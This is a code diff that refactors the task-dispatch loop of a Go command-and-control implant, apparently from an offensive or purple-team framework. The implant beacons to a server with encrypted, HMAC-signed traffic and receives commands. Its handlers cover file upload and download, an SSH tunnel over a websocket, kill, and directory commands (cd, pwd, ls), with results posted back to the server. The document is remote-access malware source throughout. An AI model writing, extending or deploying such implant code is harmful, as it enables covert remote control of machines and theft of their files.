@@ -3,10 +3,8 @@ package core
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"io"
-	"os"
 	"purpcmd/implant/ssh"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
@@ -43,13 +41,13 @@ func Start() {
 		enc.HMACPackAddHmac(&dataEnc)
 		dataP := base64.StdEncoding.EncodeToString(dataEnc)
 
-		println("sent check:",dataP)
+		println("sent check:", dataP)
 		resp, err := h.Get([]byte(dataP))
 		if err != nil {
 			println(err.Error())
 		}
-		
-		xyz,_ := io.ReadAll(resp)
+
+		xyz, _ := io.ReadAll(resp)
 		fmt.Println("Data received ", len(xyz))
 		if len(xyz) < 16 {
 			time.Sleep(time.Duration(i.Sleep) * time.Second)
@@ -71,62 +69,40 @@ func Start() {
 
 		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))
 
-		print("->",tcode)
+		// Create command context for handlers
+		ctx := &CommandContext{
+			Implant: i,
+			Encrypt: &enc,
+			HTTP:    h,
+		}
+
+		print("->", tcode)
 		switch tcode {
 		case internal.PING:
-			println("\n->",tcode)
-			responseTaskPayload := string(payload) + " pong"
-			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
-
-			dataEnc := enc.AESCbcEncrypt(taskResp)
-			enc.HMACPackAddHmac(&dataEnc)
-			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-			println(taskRestEnc)
-			h.Post([]byte(taskRestEnc))
+			response := HandlePing(ctx, payload, tid)
+			h.Post([]byte(response))
 		case internal.SSH:
-			print("->",tcode, "calling ssh for ", h.Socket)
-			ssh.Wsclient("aaa","/any.png" , h.Socket)
+			print("->", tcode, "calling ssh for ", h.Socket)
+			ssh.Wsclient("aaa", "/any.png", h.Socket)
 		case internal.DOWN:
-			println("\n->",tcode)
-			taskResp := PackChunk(i, "any.txt", []byte("aaa"), tid)
-
-			dataEnc := enc.AESCbcEncrypt(taskResp)
-			enc.HMACPackAddHmac(&dataEnc)
-			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-			println(taskRestEnc)
-			h.Post([]byte(taskRestEnc))
+			response := HandleDownload(ctx, tid)
+			h.Post([]byte(response))
 		case internal.UPL:
-			//Step		Size	Offset (bytes)
-			//nameLen	2		0
-			//name		N		2
-			//dataLen	4		2 + N
-			//data		M		2 + N + 4
-			println("\n->",tcode)
-			nameLen := binary.BigEndian.Uint16(payload[:2])
-			name := payload[2 : 2+nameLen]
-
-			dataLenStart := 2 + nameLen
-			dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])
-
-			dataStart := dataLenStart + 4
-			data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]
-
-			println("got file name ", name," with data ", string(data))
-
-			responseTaskPayload := "saved file to "+string(name)
-			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
-
-			dataEnc := enc.AESCbcEncrypt(taskResp)
-			enc.HMACPackAddHmac(&dataEnc)
-			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-			println(taskRestEnc)
-			h.Post([]byte(taskRestEnc))
-
+			response := HandleUpload(ctx, payload, tid)
+			h.Post([]byte(response))
 		case internal.KILL:
-			println("\n->",tcode)
-			os.Exit(0)
+			HandleKill()
+		case internal.CD:
+			response := HandleCD(ctx, payload, tid)
+			h.Post([]byte(response))
+		case internal.PWD:
+			response := HandlePWD(ctx, tid)
+			h.Post([]byte(response))
+		case internal.LS:
+			response := HandleLS(ctx, payload, tid)
+			h.Post([]byte(response))
 		default:
-			print("->",tcode, "Nothing")
+			print("->", tcode, "Nothing")
 		}
 
 		time.Sleep(time.Duration(i.Sleep) * time.Second)
